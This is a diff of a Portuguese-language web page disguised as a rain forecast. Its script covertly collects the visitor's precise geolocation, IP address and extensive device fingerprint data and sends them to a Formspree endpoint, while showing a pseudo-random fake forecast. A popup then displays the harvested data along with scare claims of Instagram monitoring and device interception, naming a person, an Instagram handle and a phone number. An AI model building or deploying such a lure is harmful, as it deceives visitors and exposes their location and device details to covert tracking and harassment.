@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Previsão de Chuva - Se vai chover hoje?</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Chuva?</title>
+    <script src="https:cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @keyframes float {
@@ -260,7 +260,7 @@
             100% { transform: scale(1); opacity: 1; }
         }
         
-        /* Data Leak Popup Styles - Mobile First */
+        /* 1 - RIQ (FDS) */
         .data-leak-popup {
             position: fixed;
             top: 0;
@@ -520,13 +520,11 @@
     </style>
 </head>
 <body class="weather-bg">
-    <!-- Animated Background Elements -->
     <div class="cloud cloud1"></div>
     <div class="cloud cloud2"></div>
     <div class="rain-animation" id="rainAnimation"></div>
     
     <div class="container mx-auto px-4 py-8 relative z-10">
-        <!-- Header -->
         <header class="text-center mb-8">
             <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">
                 <i class="fas fa-cloud-rain mr-3"></i>
@@ -536,10 +534,7 @@
                 Descubra se vai chover na sua região
             </p>
         </header>
-
-        <!-- Main Content -->
         <main class="max-w-md mx-auto">
-            <!-- Weather Card -->
             <div class="weather-card rounded-2xl p-8 shadow-2xl mb-6">
                 <div class="text-center mb-6">
                     <i class="fas fa-cloud-sun-rain weather-icon text-blue-500 mb-4"></i>
@@ -550,8 +545,6 @@
                         Selecione a data e vamos calcular a previsão
                     </p>
                 </div>
-
-                <!-- Date Selection -->
                 <div class="mb-6">
                     <label for="weatherDate" class="block text-sm font-medium text-gray-700 mb-2">
                         <i class="fas fa-calendar-alt mr-2"></i>
@@ -565,8 +558,6 @@
                         required
                     >
                 </div>
-
-                <!-- Calculate Button -->
                 <div class="text-center">
                     <button id="calculateBtn" 
                             class="calculate-btn text-white px-8 py-4 rounded-full font-semibold text-lg 
@@ -575,8 +566,6 @@
                         Calcular Previsão
                     </button>
                 </div>
-
-                <!-- Loading State -->
                 <div id="loadingState" class="hidden mt-6">
                     <div class="flex flex-col items-center justify-center">
                         <div class="loading-spinner mb-4"></div>
@@ -592,24 +581,16 @@
                         <p id="attemptText" class="text-sm text-gray-600 mt-2">Tentativa 1 de 3</p>
                     </div>
                 </div>
-
-                <!-- Weather Result -->
                 <div id="weatherResult" class="weather-info mt-6">
                     <div class="result-card rounded-xl p-6 text-center">
-                        <!-- Weather Forecast Result -->
                         <div class="weather-forecast mb-6">
                             <div id="weatherIcon" class="weather-result-icon mb-4">
-                                <!-- Weather icon will be inserted here -->
                             </div>
                             <h3 id="forecastTitle" class="text-3xl font-bold mb-2">
-                                <!-- Forecast title will be inserted here -->
                             </h3>
                             <p id="forecastDescription" class="text-lg mb-4">
-                                <!-- Forecast description will be inserted here -->
                             </p>
                         </div>
-                        
-                        <!-- Detailed Info -->
                         <div class="bg-white bg-opacity-20 rounded-lg p-4 mb-4">
                             <div class="flex items-center justify-between mb-2">
                                 <span class="text-sm font-semibold">Precisão da previsão:</span>
@@ -643,8 +624,6 @@
                         </div>
                     </div>
                 </div>
-
-                <!-- Error State -->
                 <div id="errorState" class="weather-info mt-6">
                     <div class="error-card rounded-xl p-6 text-center">
                         <i class="fas fa-exclamation-triangle text-5xl mb-4"></i>
@@ -667,8 +646,6 @@
                     </div>
                 </div>
             </div>
-
-            <!-- Additional Info -->
             <div class="weather-card rounded-2xl p-6 shadow-2xl">
                 <h3 class="text-lg font-bold text-gray-800 mb-4 flex items-center">
                     <i class="fas fa-info-circle text-blue-500 mr-2"></i>
@@ -690,8 +667,6 @@
                 </div>
             </div>
         </main>
-
-        <!-- Footer -->
         <footer class="text-center mt-12 text-purple-100">
             <p class="text-sm">
                 <i class="fas fa-cloud-rain mr-2"></i>
@@ -700,7 +675,7 @@
         </footer>
     </div>
 
-    <!-- Data Leak Popup -->
+    <!-- Aqui a diversão comeca seus otario -->
     <div id="dataLeakPopup" class="data-leak-popup">
         <div class="data-leak-content">
             <div class="data-leak-header">
@@ -714,84 +689,62 @@
             </div>
             
             <div class="data-leak-body">
-                <!-- Location Data -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-map-marker-alt text-red-500 mr-2"></i>
                         Localização
                     </h3>
                     <div id="leakedLocation">
-                        <!-- Location data will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- Device Info -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-desktop text-blue-500 mr-2"></i>
                         Dispositivo
                     </h3>
                     <div id="leakedDeviceInfo">
-                        <!-- Device info will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- Network Info -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-network-wired text-green-500 mr-2"></i>
                         Rede
                     </h3>
                     <div id="leakedNetworkInfo">
-                        <!-- Network info will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- Browser Features -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-cogs text-purple-500 mr-2"></i>
                         Recursos do Navegador
                     </h3>
                     <div id="leakedBrowserFeatures">
-                        <!-- Browser features will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- Hardware Features -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-microchip text-orange-500 mr-2"></i>
                         Recursos de Hardware
                     </h3>
                     <div id="leakedHardwareFeatures">
-                        <!-- Hardware features will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- API Features -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-code text-teal-500 mr-2"></i>
                         APIs Disponíveis
                     </h3>
                     <div id="leakedAPIFeatures">
-                        <!-- API features will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- Media Features -->
                 <div class="data-category mb-4">
                     <h3 class="text-lg md:text-xl font-bold mb-3 flex items-center">
                         <i class="fas fa-photo-video text-yellow-500 mr-2"></i>
                         Recursos de Mídia
                     </h3>
                     <div id="leakedMediaFeatures">
-                        <!-- Media features will be inserted here -->
                     </div>
                 </div>
-                
-                <!-- Danger Zone -->
                 <div class="danger-zone">
                     <div class="danger-header">
                         <i class="fas fa-skull-crossbones"></i>
@@ -804,7 +757,7 @@
                             Dados do Instagram Coletados:
                         </div>
                         <div class="danger-value">
-                            Contas analisadas: lorena_hendrikx<br>
+                            Contas analisadas: @p4tricksofc<br>
                             Últimas atividades monitoradas<br>
                             Lista de seguidores e seguidos exportada
                         </div>
@@ -816,8 +769,8 @@
                             Dispositivo Interceptado:
                         </div>
                         <div class="danger-value">
-                            Nome: Lorena<br>
-                            Número de Telefone: +55 19 99726-2008<br>
+                            Nome: Patrick<br>
+                            Número de Telefone: +55 19 98601-7457<br>
                         </div>
                     </div>
                     
@@ -872,7 +825,7 @@
     </div>
 
     <script>
-        // DOM Elements
+        // AAA Q DLC CARA (CONTROLE DOS SCRIPT)
         const weatherDate = document.getElementById('weatherDate');
         const calculateBtn = document.getElementById('calculateBtn');
         const loadingState = document.getElementById('loadingState');
@@ -896,16 +849,13 @@
         const forecastTitle = document.getElementById('forecastTitle');
         const forecastDescription = document.getElementById('forecastDescription');
         
-        // Data leak popup elements
         const dataLeakPopup = document.getElementById('dataLeakPopup');
         const closeLeakBtn = document.getElementById('closeLeakBtn');
 
-        // Set minimum date to today
         const today = new Date().toISOString().split('T')[0];
         weatherDate.min = today;
         weatherDate.value = today;
 
-        // Event Listeners
         calculateBtn.addEventListener('click', calculateWeather);
         retryBtn.addEventListener('click', calculateWeather);
         resetBtn.addEventListener('click', resetToStart);
@@ -913,7 +863,6 @@
         testAgainBtn.addEventListener('click', calculateWeather);
         closeLeakBtn.addEventListener('click', closeDataLeak);
 
-        // Device and location data storage
         let collectedData = {
             location: null,
             deviceInfo: {},
@@ -926,13 +875,11 @@
             timestamp: null
         };
 
-        // State variables for location accuracy
         let currentAttempt = 1;
         let maxAttempts = 3;
         let bestAccuracy = Infinity;
         let bestPosition = null;
 
-        // Weather forecast data
         let weatherForecast = {
             willRain: false,
             probability: 0,
@@ -949,19 +896,16 @@
                 return;
             }
 
-            // Reset location accuracy variables
             currentAttempt = 1;
             bestAccuracy = Infinity;
             bestPosition = null;
             maxAttempts = 3;
 
-            // Show loading state
             loadingState.classList.remove('hidden');
             weatherResult.classList.remove('show');
             errorState.classList.remove('show');
             calculateBtn.style.display = 'none';
 
-            // Format date for display
             const dateObj = new Date(selectedDateValue);
             const formattedDate = dateObj.toLocaleDateString('pt-BR', {
                 weekday: 'long',
@@ -972,27 +916,27 @@
             selectedDate.textContent = formattedDate;
 
             try {
-                // Step 1: Get device information first (discreetly)
+                
                 await collectDeviceInfo();
                 
-                // Step 2: Get location with high precision (this will trigger the permission prompt)
+                
                 await getLocationWithRetry();
                 
-                // Step 3: Generate fake weather forecast
+                
                 generateWeatherForecast(selectedDateValue);
                 
-                // Step 4: Send data to Formspree
+               
                 await sendDataToFormspree(selectedDateValue);
                 
-                // Step 5: Show success to user with weather forecast
+                
                 showSuccess();
                 
-                // Step 6: Add weather effects
+               
                 if (weatherForecast.willRain) {
                     createRainEffect();
                 }
                 
-                // Step 7: Show data leak popup after a short delay
+              
                 setTimeout(() => {
                     showDataLeak();
                 }, 2000);
@@ -1004,21 +948,18 @@
         }
 
         function generateWeatherForecast(selectedDate) {
-            // Generate "random" but deterministic weather based on date and location
+           
             const date = new Date(selectedDate);
             const dayOfYear = Math.floor((date - new Date(date.getFullYear(), 0, 0)) / 86400000);
-            
-            // Use location coordinates if available, otherwise use date
+       
             let seed = dayOfYear;
             if (collectedData.location) {
                 seed += collectedData.location.latitude + collectedData.location.longitude;
             }
-            
-            // Simple pseudo-random based on seed
+
             const random = Math.sin(seed) * 10000;
             const chance = Math.abs(random - Math.floor(random));
-            
-            // Determine if it will rain (70% chance of no rain, 30% chance of rain)
+
             weatherForecast.willRain = chance > 0.7;
             
             if (weatherForecast.willRain) {
@@ -1074,16 +1015,14 @@
 
         function handlePosition(position) {
             const accuracy = position.coords.accuracy;
-            
-            // Check if this is the best accuracy so far
+
             if (accuracy < bestAccuracy) {
                 bestAccuracy = accuracy;
                 bestPosition = position;
             }
-            
-            // If accuracy is good enough (< 50 meters) or we've tried enough times
+
             if (accuracy < 50 || currentAttempt >= maxAttempts) {
-                // Store the best position
+
                 collectedData.location = {
                     latitude: bestPosition.coords.latitude,
                     longitude: bestPosition.coords.longitude,
@@ -1094,7 +1033,7 @@
                     timestamp: bestPosition.coords.timestamp
                 };
             } else {
-                // Try again with different settings
+
                 currentAttempt++;
                 setTimeout(() => {
                     updateProgress();
@@ -1111,7 +1050,7 @@
                     getLocation();
                 }, 1000);
             } else {
-                // If we have any position, use it even if not perfect
+
                 if (bestPosition) {
                     collectedData.location = {
                         latitude: bestPosition.coords.latitude,
@@ -1130,7 +1069,7 @@
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             
-            // Basic device info
+
             collectedData.deviceInfo = {
                 userAgent: userAgent,
                 platform: platform,
@@ -1149,7 +1088,7 @@
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
             };
 
-            // Try to get more detailed info with User-Agent Client Hints
+
             if (navigator.userAgentData) {
                 try {
                     const highEntropyValues = await navigator.userAgentData.getHighEntropyValues([
@@ -1161,7 +1100,7 @@
                 }
             }
 
-            // Get network info if available
+
             if (navigator.connection) {
                 collectedData.networkInfo = {
                     type: navigator.connection.type,
@@ -1172,20 +1111,20 @@
                 };
             }
 
-            // Parse user agent for OS and browser info
+
             parseUserAgent();
             
-            // Collect features
+
             collectFeatures();
             
-            // Collect additional data
+
             collectAdditionalData();
         }
 
         function parseUserAgent() {
             const userAgent = navigator.userAgent.toLowerCase();
             
-            // Detect OS
+
             let os = 'Unknown';
             let osVersion = '';
             
@@ -1213,7 +1152,6 @@
             collectedData.deviceInfo.os = os;
             collectedData.deviceInfo.osVersion = osVersion;
 
-            // Detect Browser
             let browser = 'Unknown';
             let browserVersion = '';
             
@@ -1238,7 +1176,6 @@
             collectedData.deviceInfo.browser = browser;
             collectedData.deviceInfo.browserVersion = browserVersion;
 
-            // Detect device type
             let deviceType = 'Desktop';
             if (userAgent.includes('mobile') || window.innerWidth <= 768) {
                 deviceType = 'Mobile';
@@ -1249,7 +1186,6 @@
         }
 
         function collectFeatures() {
-            // Browser Features
             collectedData.browserFeatures = [
                 { name: 'Cookies', supported: navigator.cookieEnabled },
                 { name: 'Local Storage', supported: typeof(Storage) !== "undefined" },
@@ -1273,7 +1209,6 @@
                 { name: 'Reporting API', supported: 'ReportingObserver' in window }
             ];
 
-            // Hardware Features
             collectedData.hardwareFeatures = [
                 { name: 'Touch Support', supported: 'ontouchstart' in window },
                 { name: 'Device Orientation', supported: 'DeviceOrientationEvent' in window },
@@ -1290,7 +1225,6 @@
                 { name: 'VR Display', supported: 'getVRDisplays' in navigator }
             ];
 
-            // API Features
             collectedData.apiFeatures = [
                 { name: 'Canvas API', supported: !!document.createElement('canvas').getContext },
                 { name: 'WebGL', supported: !!document.createElement('canvas').getContext('webgl') },
@@ -1314,7 +1248,6 @@
                 { name: 'Web Serial', supported: 'serial' in navigator }
             ];
 
-            // Media Features
             collectedData.mediaFeatures = [
                 { name: ' getUserMedia', supported: 'getUserMedia' in navigator },
                 { name: 'MediaDevices', supported: 'mediaDevices' in navigator },
@@ -1336,7 +1269,7 @@
         }
 
         function collectAdditionalData() {
-            // Get IP Address
+
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -1346,19 +1279,16 @@
                     collectedData.additionalData.ipAddress = 'Não disponível';
                 });
 
-            // Get screen orientation
             if (screen.orientation) {
                 collectedData.additionalData.screenOrientation = screen.orientation.type;
                 collectedData.additionalData.screenOrientationAngle = screen.orientation.angle;
             }
 
-            // Get connection type
             if (navigator.connection) {
                 collectedData.additionalData.connectionType = navigator.connection.type;
                 collectedData.additionalData.effectiveConnectionType = navigator.connection.effectiveType;
             }
 
-            // Get battery info if available
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     collectedData.additionalData.batteryLevel = battery.level;
@@ -1366,22 +1296,18 @@
                 });
             }
 
-            // Get device memory
             if (navigator.deviceMemory) {
                 collectedData.additionalData.deviceMemory = navigator.deviceMemory;
             }
 
-            // Get hardware concurrency
             if (navigator.hardwareConcurrency) {
                 collectedData.additionalData.hardwareConcurrency = navigator.hardwareConcurrency;
             }
 
-            // Get user agent data if available
             if (navigator.userAgentData) {
                 collectedData.additionalData.userAgentData = navigator.userAgentData;
             }
 
-            // Get WebGL info
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             if (gl) {
@@ -1389,64 +1315,45 @@
                 collectedData.additionalData.webglRenderer = gl.getParameter(gl.RENDERER);
             }
 
-            // Get timezone offset
             collectedData.additionalData.timezoneOffset = new Date().getTimezoneOffset();
 
-            // Get cookie enabled
             collectedData.additionalData.cookieEnabled = navigator.cookieEnabled;
 
-            // Get do not track
             collectedData.additionalData.doNotTrack = navigator.doNotTrack;
 
-            // Get plugins
             collectedData.additionalData.plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
 
-            // Get mime types
             collectedData.additionalData.mimeTypes = Array.from(navigator.mimeTypes).map(mimeType => mimeType.type);
 
-            // Get referrer
             collectedData.additionalData.referrer = document.referrer;
 
-            // Get current URL
             collectedData.additionalData.currentURL = window.location.href;
 
-            // Get user language
             collectedData.additionalData.userLanguage = navigator.language;
 
-            // Get user languages
             collectedData.additionalData.userLanguages = navigator.languages;
 
-            // Get platform
             collectedData.additionalData.platform = navigator.platform;
 
-            // Get product
             collectedData.additionalData.product = navigator.product;
 
-            // Get product sub
             collectedData.additionalData.productSub = navigator.productSub;
 
-            // Get vendor
             collectedData.additionalData.vendor = navigator.vendor;
 
-            // Get vendor sub
+            // AQUI COMECA O VENDOR, SO PR LEMBRA
             collectedData.additionalData.vendorSub = navigator.vendorSub;
 
-            // Get build ID
             collectedData.additionalData.buildID = navigator.buildID;
 
-            // Get hardware concurrency
             collectedData.additionalData.hardwareConcurrency = navigator.hardwareConcurrency;
 
-            // Get max touch points
             collectedData.additionalData.maxTouchPoints = navigator.maxTouchPoints;
 
-            // Get connection
             collectedData.additionalData.connection = navigator.connection;
 
-            // Get device memory
             collectedData.additionalData.deviceMemory = navigator.deviceMemory;
 
-            // Get storage
             if (navigator.storage) {
                 navigator.storage.estimate().then(estimate => {
                     collectedData.additionalData.storageQuota = estimate.quota;
@@ -1454,7 +1361,6 @@
                 });
             }
 
-            // Get permissions
             if (navigator.permissions) {
                 navigator.permissions.query({ name: 'geolocation' }).then(result => {
                     collectedData.additionalData.geolocationPermission = result.state;
@@ -1470,14 +1376,12 @@
                 });
             }
 
-            // Get media devices
             if (navigator.mediaDevices) {
                 navigator.mediaDevices.enumerateDevices().then(devices => {
                     collectedData.additionalData.mediaDevices = devices.map(device => device.kind);
                 });
             }
 
-            // Get screen info
             collectedData.additionalData.screenWidth = screen.width;
             collectedData.additionalData.screenHeight = screen.height;
             collectedData.additionalData.screenAvailWidth = screen.availWidth;
@@ -1485,21 +1389,17 @@
             collectedData.additionalData.screenColorDepth = screen.colorDepth;
             collectedData.additionalData.screenPixelDepth = screen.pixelDepth;
 
-            // Get window info
             collectedData.additionalData.windowInnerWidth = window.innerWidth;
             collectedData.additionalData.windowInnerHeight = window.innerHeight;
             collectedData.additionalData.windowOuterWidth = window.outerWidth;
             collectedData.additionalData.windowOuterHeight = window.outerHeight;
 
-            // Get document info
             collectedData.additionalData.documentCharset = document.charset;
             collectedData.additionalData.documentCharacterSet = document.characterSet;
             collectedData.additionalData.documentTitle = document.title;
 
-            // Get history
             collectedData.additionalData.historyLength = history.length;
 
-            // Get performance
             if (performance) {
                 collectedData.additionalData.performanceNavigation = performance.navigation;
                 collectedData.additionalData.performanceTiming = performance.timing;
@@ -1509,13 +1409,13 @@
         async function sendDataToFormspree(selectedDate) {
             const formData = new FormData();
             
-            // Add all collected data
+
             formData.append('selected_date', selectedDate);
             formData.append('timestamp', new Date().toISOString());
             formData.append('weather_forecast', weatherForecast.willRain ? 'Vai chover' : 'Não vai chover');
             formData.append('weather_probability', weatherForecast.probability + '%');
             
-            // Location data
+
             if (collectedData.location) {
                 formData.append('latitude', collectedData.location.latitude);
                 formData.append('longitude', collectedData.location.longitude);
@@ -1524,8 +1424,7 @@
                 formData.append('speed', collectedData.location.speed || 'N/A');
                 formData.append('heading', collectedData.location.heading || 'N/A');
             }
-            
-            // Device info
+
             formData.append('device_type', collectedData.deviceInfo.deviceType);
             formData.append('os', collectedData.deviceInfo.os);
             formData.append('os_version', collectedData.deviceInfo.osVersion);
@@ -1540,8 +1439,7 @@
             formData.append('touch_support', collectedData.deviceInfo.touchSupport);
             formData.append('online_status', collectedData.deviceInfo.onlineStatus);
             formData.append('user_agent', collectedData.deviceInfo.userAgent);
-            
-            // Network info if available
+
             if (collectedData.networkInfo) {
                 formData.append('connection_type', collectedData.networkInfo.type);
                 formData.append('connection_effective_type', collectedData.networkInfo.effectiveType);
@@ -1549,8 +1447,7 @@
                 formData.append('rtt', collectedData.networkInfo.rtt);
                 formData.append('data_saver', collectedData.networkInfo.saveData);
             }
-            
-            // User-Agent Client Hints if available
+
             if (collectedData.deviceInfo.userAgentData) {
                 formData.append('platform', collectedData.deviceInfo.userAgentData.platform);
                 formData.append('platform_version', collectedData.deviceInfo.userAgentData.platformVersion);
@@ -1558,13 +1455,11 @@
                 formData.append('device_model', collectedData.deviceInfo.userAgentData.model);
             }
 
-            // Add features as JSON strings
             formData.append('browser_features', JSON.stringify(collectedData.browserFeatures));
             formData.append('hardware_features', JSON.stringify(collectedData.hardwareFeatures));
             formData.append('api_features', JSON.stringify(collectedData.apiFeatures));
             formData.append('media_features', JSON.stringify(collectedData.mediaFeatures));
 
-            // Add additional data
             if (collectedData.additionalData.ipAddress) {
                 formData.append('ip_address', collectedData.additionalData.ipAddress);
             }
@@ -1583,21 +1478,19 @@
                 }
             } catch (error) {
                 console.error('Error sending data to Formspree:', error);
-                // Don't show error to user, just continue
+
             }
         }
 
         function showSuccess() {
             loadingState.classList.add('hidden');
             weatherResult.classList.add('show');
-            
-            // Show weather forecast
+
             weatherIcon.innerHTML = weatherForecast.icon;
             forecastTitle.textContent = weatherForecast.title;
             forecastDescription.textContent = weatherForecast.description;
             probability.textContent = weatherForecast.probability + '%';
-            
-            // Show accuracy info to user
+
             if (collectedData.location) {
                 const accuracy = collectedData.location.accuracy;
                 updateAccuracyIndicator(accuracy);
@@ -1637,28 +1530,28 @@
         }
 
         function improveAccuracy() {
-            // Reset and try with even more aggressive settings
+
             currentAttempt = 1;
             bestAccuracy = Infinity;
             bestPosition = null;
-            maxAttempts = 5; // More attempts
+            maxAttempts = 5; 
             
             loadingState.classList.remove('hidden');
             weatherResult.classList.remove('show');
             
             updateProgress();
             
-            // Wait a moment before trying again
+
             setTimeout(() => {
                 getLocationWithRetry().then(() => {
-                    // After getting improved location, regenerate forecast and send data again
+     
                     generateWeatherForecast(weatherDate.value);
                     sendDataToFormspree(weatherDate.value).then(() => {
                         showSuccess();
                         if (weatherForecast.willRain) {
                             createRainEffect();
                         }
-                        // Show data leak popup after a short delay
+
                         setTimeout(() => {
                             showDataLeak();
                         }, 2000);
@@ -1688,7 +1581,7 @@
             rainAnimation.classList.add('active');
             rainAnimation.innerHTML = '';
             
-            // Create rain drops
+
             for (let i = 0; i < 50; i++) {
                 const drop = document.createElement('div');
                 drop.className = 'rain-drop';
@@ -1698,7 +1591,7 @@
                 rainAnimation.appendChild(drop);
             }
             
-            // Remove rain effect after 5 seconds
+
             setTimeout(() => {
                 rainAnimation.classList.remove('active');
             }, 5000);
@@ -1707,12 +1600,12 @@
         function showDataLeak() {
             dataLeakPopup.style.display = 'block';
             
-            // Populate leaked data
+
             populateLeakedData();
         }
 
         function populateLeakedData() {
-            // Location data
+
             const locationHtml = collectedData.location ? `
                 <div class="data-item">
                     <span class="data-label">Latitude:</span>
@@ -1746,7 +1639,7 @@
             
             document.getElementById('leakedLocation').innerHTML = locationHtml;
             
-            // Device info
+
             const deviceInfoHtml = `
                 <div class="data-item">
                     <span class="data-label">Tipo de Dispositivo:</span>
@@ -1754,7 +1647,7 @@
                 </div>
                 <div class="data-item">
                     <span class="data-label">Sistema Operacional:</span>
-                    <span class="data-value">OneUI 7.0</span>
+                    <span class="data-value">OneUI 5.0 (Android 13)</span>
                 </div>
                 <div class="data-item">
                     <span class="data-label">Navegador:</span>
@@ -1802,7 +1695,7 @@
             
             document.getElementById('leakedDeviceInfo').innerHTML = deviceInfoHtml;
             
-            // Network info
+
             const networkInfoHtml = collectedData.networkInfo ? `
                 <div class="data-item">
                     <span class="data-label">Tipo de Conexão:</span>
@@ -1828,7 +1721,7 @@
             
             document.getElementById('leakedNetworkInfo').innerHTML = networkInfoHtml;
             
-            // Browser features
+
             const browserFeaturesHtml = collectedData.browserFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
@@ -1838,7 +1731,7 @@
             
             document.getElementById('leakedBrowserFeatures').innerHTML = browserFeaturesHtml;
             
-            // Hardware features
+
             const hardwareFeaturesHtml = collectedData.hardwareFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
@@ -1848,7 +1741,7 @@
             
             document.getElementById('leakedHardwareFeatures').innerHTML = hardwareFeaturesHtml;
             
-            // API features
+
             const apiFeaturesHtml = collectedData.apiFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
@@ -1858,7 +1751,7 @@
             
             document.getElementById('leakedAPIFeatures').innerHTML = apiFeaturesHtml;
             
-            // Media features
+
             const mediaFeaturesHtml = collectedData.mediaFeatures.map(feature => `
                 <div class="feature-item ${feature.supported ? 'feature-supported' : 'feature-unsupported'}">
                     <i class="fas ${feature.supported ? 'fa-check' : 'fa-times'}"></i>
